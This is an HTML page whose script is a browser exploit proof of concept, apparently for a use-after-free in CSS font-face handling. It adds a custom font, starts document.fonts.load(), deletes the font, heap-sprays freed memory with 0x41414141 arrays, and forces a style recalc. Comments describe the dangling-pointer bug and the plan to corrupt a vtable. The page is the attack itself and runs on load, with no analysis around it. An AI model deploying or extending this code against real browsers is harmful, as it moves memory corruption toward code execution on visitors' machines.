<!DOCTYPE html>
<html>
<head>
<style>
body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:8px; }
.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; } .warn { color:#ff0; }
</style>
</head>
<body>
<div id="log"></div>
<script>
function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}

log("=== CSSFONTFACE USE-AFTER-FREE ===", "info");
log("[*] Setting up the custom font...", "info");

// Create a custom font face
let font = new FontFace("CrashFont", "local(Arial)");
document.fonts.add(font);

log("[!] Font added to document.fonts", "warn");
log("[!] Calling document.fonts.load() - C++ will cache a RAW POINTER to our font!", "hit");

// Trigger FontFaceSet::load()
// C++ creates a non-owning Vector<std::reference_wrapper<CSSFontFace>> 
// containing our font. Then it starts processing it, sometimes asynchronously.
let loadPromise = document.fonts.load("12px CrashFont");

// Immediately delete the font and drop our references!
// The C++ FontFaceSet still holds the raw pointer in its matchingFaces vector!
log("[!] IMMEDIATELY DELETING THE FONT FROM THE SET!", "hit");
document.fonts.delete(font);
font = null;

// Spam allocations to overwrite the freed FontFace memory with absolute garbage!
// When C++ goes to check the font status, it will read our A's instead of a vtable!
let spray = [];
for (let i = 0; i < 50000; i++) {
    // 0x41414141 -> Segfault city
    spray.push(new Uint32Array(32).fill(0x41414141)); 
}
log("[!] Heap sprayed with garbage. Brace for impact!", "warn");

loadPromise.then(() => {
    log("[-] Load finished without crashing. Allocator masked it or GC didn't run fast enough.", "info");
    // Sometimes we need to force a style recalc to poke the dead font
    document.body.style.fontFamily = "CrashFont";
}).catch(e => {
    log("[-] Load rejected: " + e.message, "info");
});

</script>
</body>
</html>
